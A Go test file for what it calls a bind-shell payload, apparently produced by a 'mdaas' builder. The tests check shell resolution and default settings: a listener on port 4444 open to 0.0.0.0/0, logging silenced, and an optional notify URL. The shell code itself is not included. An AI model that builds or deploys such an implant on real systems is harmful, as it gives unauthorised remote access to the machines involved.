package main

import (
	"log/slog"
	"os"
	"os/exec"
	"testing"
)

// TestGetCommandToExecute asserts the pure shell-resolution helper returns a
// usable command. On any reasonable host at least "/bin/sh" exists, so the
// returned path must be non-empty.
func TestGetCommandToExecute(t *testing.T) {
	got := getCommandToExecute()
	if got == "" {
		t.Fatal("getCommandToExecute returned empty string")
	}

	// The result is either one of the preferred shells (resolved to an
	// absolute path by exec.LookPath) or the "/bin/sh" fallback.
	if got == "/bin/sh" {
		return
	}

	// If a preferred shell was found, exec.LookPath returned a real path;
	// verify it actually resolves to an existing executable.
	resolved, err := exec.LookPath(got)
	if err != nil {
		t.Errorf("getCommandToExecute returned %q which is not in PATH: %v", got, err)
	}
	if resolved == "" {
		t.Errorf("getCommandToExecute returned %q which does not resolve", got)
	}
}

// TestGetCommandToExecuteDeterministic ensures the helper is deterministic for
// a fixed environment (no random selection between calls).
func TestGetCommandToExecuteDeterministic(t *testing.T) {
	first := getCommandToExecute()
	for i := 0; i < 5; i++ {
		if got := getCommandToExecute(); got != first {
			t.Fatalf("getCommandToExecute not deterministic: got %q then %q", first, got)
		}
	}
}

// TestPackageDefaults documents the build-time-overridable defaults. These are
// part of the program's contract (the mdaas builder overrides them via
// -ldflags) so a change here should be intentional.
func TestPackageDefaults(t *testing.T) {
	if listener != ":4444" {
		t.Errorf("default listener = %q, want %q", listener, ":4444")
	}
	if allowedCIDR != "0.0.0.0/0" {
		t.Errorf("default allowedCIDR = %q, want %q", allowedCIDR, "0.0.0.0/0")
	}
	if logLevel != "NONE" {
		t.Errorf("default logLevel = %q, want %q", logLevel, "NONE")
	}
	if notifyURL != "" {
		t.Errorf("default notifyURL = %q, want empty", notifyURL)
	}
}

// TestLogLevelsMap asserts the log-level lookup table maps the standard slog
// level strings to their slog.Level values and treats "NONE" as a sentinel
// above the standard levels (effectively disabling output).
func TestLogLevelsMap(t *testing.T) {
	cases := map[string]slog.Level{
		slog.LevelInfo.String():  slog.LevelInfo,
		slog.LevelWarn.String():  slog.LevelWarn,
		slog.LevelError.String(): slog.LevelError,
		slog.LevelDebug.String(): slog.LevelDebug,
	}
	for name, want := range cases {
		got, ok := loglevels[name]
		if !ok {
			t.Errorf("loglevels missing key %q", name)
			continue
		}
		if got != want {
			t.Errorf("loglevels[%q] = %v, want %v", name, got, want)
		}
	}
	if loglevels["NONE"] != slog.Level(10) {
		t.Errorf("loglevels[NONE] = %v, want 10", loglevels["NONE"])
	}
}

// TestLg asserts the lazy logger helper never returns nil and is memoized.
func TestLg(t *testing.T) {
	got := lg()
	if got == nil {
		t.Fatal("lg() returned nil")
	}
	if again := lg(); again != got {
		t.Error("lg() not memoized: returned different *slog.Logger instances")
	}
}

// TestNotifyNoURLIsNoop verifies notify() does nothing (and does not panic or
// make a network call) when no notifyURL is configured, which is the default.
func TestNotifyNoURLIsNoop(t *testing.T) {
	saved := notifyURL
	notifyURL = ""
	defer func() { notifyURL = saved }()

	// Should return cleanly without attempting any HTTP POST.
	notify("hello", "world")
}

// TestBuildSmoke is a hermetic smoke test asserting the payload source still
// compiles. It runs `go build` against the package and fails only on a genuine
// compile error. If the go toolchain is unavailable it skips rather than fails.
func TestBuildSmoke(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping build smoke test in -short mode")
	}
	if _, err := exec.LookPath("go"); err != nil {
		t.Skip("go toolchain not available; skipping build smoke test")
	}

	cmd := exec.Command("go", "build", "-o", os.DevNull, ".")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("go build of bind-shell failed: %v\n%s", err, out)
	}
}
